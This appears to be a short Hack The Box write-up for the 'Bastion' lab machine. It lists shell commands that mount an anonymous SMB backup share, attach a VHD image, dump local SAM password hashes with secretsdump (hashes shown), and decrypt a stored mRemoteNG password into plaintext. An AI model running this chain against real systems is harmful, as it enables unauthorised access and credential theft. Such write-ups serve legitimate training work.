```
- Public smb share allow mounting
- Target using mRemoteNG , it saves the connections info and credentials in a file called confCons.xml

# Make sure you are root
# Create mount points on local machine
mkdir /tmp/L4mpje-PC
mkdir /tmp/vhd

# Load nbd kernel module
modprobe nbd

# Mount the SMB share to /tmp/L4mpje-PC using anonymous user
mount -t cifs //bastion.htb/Backups/WindowsImageBackup/L4mpje-PC /tmp/L4mpje-PC/ -o user=anonymous

# Prompt for password for anonymous user (if required)

# Use qemu-nbd to mount the VHD file in read-only mode
qemu-nbd -r -c /dev/nbd0 "/tmp/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd"

# Mount the nbd0p1 partition of the VHD file to /tmp/vhd
mount -r /dev/nbd0p1 /tmp/vhd

cd /tmp/vhd/Windows/System32/config

secretsdump.py LOCAL -system ./SYSTEM -sam ./SAM

Impacket v0.10.1.dev1+20230223.202738.f4b848fa - Copyright 2022 Fortra

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up... 


wget https://raw.githubusercontent.com/kmahyyg/mremoteng-decrypt/master/mremoteng_decrypt.py

./mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
Password: thXLHM96BeKL0ER2

```
https://www.hackthebox.com/achievement/machine/336799/186
